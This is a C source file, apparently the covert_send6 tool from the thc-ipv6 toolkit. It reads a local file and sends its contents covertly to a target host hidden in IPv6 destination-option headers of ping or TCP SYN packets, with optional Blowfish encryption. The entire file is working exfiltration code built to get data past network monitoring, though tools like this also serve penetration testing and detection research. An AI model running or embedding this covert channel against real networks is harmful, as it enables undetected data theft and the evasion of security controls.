#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#ifndef _HAVE_SSL
int main() {
  fprintf(stderr,
          "Error: thc-ipv6 was compiled without openssl support, covert_send6 "
          "disabled.\n");
  return -1;
}
#else
  #if (_TAKE2 > 0)
int main() {
  fprintf(stderr, "Error: tool does not work on big endian\n");
  return -1;
}
  #endif

  #include <sys/types.h>
  #include <sys/time.h>
  #include <sys/resource.h>
  #include <sys/wait.h>
  #include <time.h>
  #include <pcap.h>
  #include <openssl/evp.h>
  #include <openssl/sha.h>
  #include "thc-ipv6.h"
  #ifdef THC_USE_OPENSSL_3_API
    #include <openssl/provider.h>
  #else
    #include <openssl/blowfish.h>
  #endif

void help(char *prg) {
  printf("%s %s (c) 2022 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf(
      "Syntax: %s [-m mtu] [-k key] [-s resend] interface target file "
      "[port]\n\n",
      prg);
  printf("Options:\n");
  printf(
      "  -m mtu     specifies the maximum MTU (default: interface MTU, min: "
      "1000)\n");
  printf("  -k key     encrypt the content with Blowfish-160\n");
  printf("  -s resend  send each packet RESEND number of times, default: 1\n");
  printf("\n");
  printf(
      "Sends the content of FILE covertly to the target, And its POC - don't "
      "except\n");
  printf(
      "too much sophistication - its just put into the destination header.\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  unsigned char *pkt1 = NULL, rbuf[3570], wbuf[3570], buf[4000];
  unsigned char *src6 = NULL, *dst6 = NULL, srcmac[6] = "", *mac = srcmac,
                *dmac;
  int pkt1_len = 0, flags = 0, i = 0, mtu = 0, bytes, seq = 0, id, rounds,
      wbytes, bufsize = 0, send = 2, num = 0;
  char *interface, *key = NULL, hash[20], vec[8] = {0, 0, 0, 0, 0, 0, 0, 0};
  ;
  int    rawmode = 0, tcp_port = -1;
  FILE * f;
  #ifdef THC_USE_OPENSSL_3_API
  EVP_CIPHER_CTX *bfctx = NULL;
  OSSL_PROVIDER * legacy_provider = NULL;
  #else
  BF_KEY bfkey;
  #endif

  if (argc < 4 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  while ((i = getopt(argc, argv, "rm:k:s:")) >= 0) {
    switch (i) {
      case 'r':
        rawmode = 1;
        thc_ipv6_rawmode(1);
        break;
      case 'k':
        key = optarg;
        break;
      case 'm':
        mtu = atoi(optarg);
        break;
      case 's':
        send = atoi(optarg);
        break;
      default:
        exit(-1);
    }
  }

  if (argc < optind + 2) {
    fprintf(stderr, "Error: Not enough parameters!\n");
    help(argv[0]);
  }

  interface = argv[optind];
  dst6 = thc_resolve6(argv[optind + 1]);
  if ((f = fopen(argv[optind + 2], "r")) == NULL) {
    fprintf(stderr, "Error: file %s not found\n", argv[optind + 2]);
    exit(-1);
  }
  if (argc >= optind + 4 && argv[optind + 3] != NULL)
    tcp_port = atoi(argv[optind + 3]);

  if (mtu == 0) mtu = thc_get_mtu(interface);
  if (mtu <= 1000) {
    fprintf(stderr, "Error: MTU of interface %s must be at least 1000 bytes\n",
            interface);
    exit(-1);
  }
  mac = thc_get_own_mac(interface);
  src6 = thc_get_own_ipv6(interface, dst6, PREFER_GLOBAL);
  if ((dmac = thc_get_mac(interface, src6, dst6)) == NULL) {
    fprintf(stderr, "Error: can not get MAC for target\n");
    exit(-1);
  }
  srand(getpid());
  mtu -= 128;
  if (mtu % 255 == 0)
    i = 2 * (mtu / 255);
  else
    i = 2 + 2 * (mtu / 255);
  mtu = mtu - i;
  if ((mtu + i + 14) % 8 > 0) mtu = (((mtu + i + 14) / 8) * 8) - (i + 14);
  if (mtu > 14 * 255) mtu = 14 * 255;
  if (key != NULL) {
    SHA1((unsigned char *)key, strlen(key), (unsigned char *)hash);
    #ifdef THC_USE_OPENSSL_3_API
    if ((legacy_provider = OSSL_PROVIDER_load(NULL, "legacy")) == NULL) {
      fprintf(stderr, "Error: could not load OpenSSL legacy provider\n");
      exit(-1);
    }
    if ((bfctx = EVP_CIPHER_CTX_new()) == NULL ||
        EVP_EncryptInit_ex(bfctx, EVP_bf_cfb64(), NULL,
                           (unsigned char *)hash,
                           (unsigned char *)vec) != 1) {
      fprintf(stderr, "Error: could not initialize Blowfish context\n");
      exit(-1);
    }
    #else
    memset(&bfkey, 0, sizeof(bfkey));
    BF_set_key(&bfkey, sizeof(hash), (unsigned char *)hash);
    memset(vec, 0, sizeof(vec));
    num = 0;
    #endif
  }

  id = rand();
  buf[0] = 16;
  buf[1] = 4;
  memcpy(buf + 2, (char *)&id, 4);
  buf[6] = 17;
  buf[7] = 4;

  while ((bytes = fread(rbuf, 1, mtu, f)) > 0) {
    seq++;
    if (key != NULL) {
      #ifdef THC_USE_OPENSSL_3_API
      int enc_len = 0;

      if (EVP_EncryptUpdate(bfctx, (unsigned char *)wbuf, &enc_len,
                            (unsigned char *)rbuf, bytes) != 1 ||
          enc_len != bytes) {
        fprintf(stderr, "Error: Blowfish encryption failed\n");
        exit(-1);
      }
      #else
      BF_cfb64_encrypt((unsigned char *)rbuf, (unsigned char *)wbuf, bytes,
                       &bfkey, (unsigned char *)vec, &num, BF_ENCRYPT);
      #endif
      memcpy(rbuf, wbuf, bytes);
    }
    memcpy(buf + 8, (char *)&seq, 4);
    bufsize = 12;
    rounds = bytes / 255;
    for (i = 0; i <= rounds; i++) {
      buf[bufsize] = i + 18;
      if (i == rounds)
        wbytes = bytes % 255;
      else
        wbytes = 255;
      buf[bufsize + 1] = wbytes;
      memcpy(buf + bufsize + 2, rbuf + 255 * i, wbytes);
      bufsize += wbytes + 2;
    }
    if (bytes < mtu) {
      buf[bufsize] = 0x1f;
      buf[bufsize + 1] = 0;
      bufsize = bufsize + 2;
    }

    if ((pkt1 = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt1_len,
                                         src6, dst6, 0, 0, 0, 0, 0)) == NULL)
      return -1;
    if (thc_add_hdr_dst(pkt1, &pkt1_len, buf, bufsize)) return -1;
    if (tcp_port == -1) {
      if (thc_add_icmp6(pkt1, &pkt1_len, ICMP6_ECHOREQUEST, 0, flags, NULL, 0,
                        0) < 0)
        return -1;
    } else {
      if (thc_add_tcp(pkt1, &pkt1_len, (rand() % 45536) + 10000, tcp_port,
                      rand(), 0, TCP_SYN, 5760, 0, NULL, 0, NULL, 0) < 0)
        return -1;
    }
    if (thc_generate_pkt(interface, mac, dmac, pkt1, &pkt1_len) < 0) {
      fprintf(stderr, "Error: Can not generate packet, exiting ...\n");
      exit(-1);
    }
    printf("Sending packet seq# %d\n", seq);
    for (i = 0; i < send; i++) {
      thc_send_pkt(interface, pkt1, &pkt1_len);
      usleep(100);
    }
    pkt1 = thc_destroy_packet(pkt1);
  }
  printf("All sent.\n");
  #ifdef THC_USE_OPENSSL_3_API
  if (bfctx != NULL) EVP_CIPHER_CTX_free(bfctx);
  if (legacy_provider != NULL) OSSL_PROVIDER_unload(legacy_provider);
  #endif
  return 0;
}

#endif
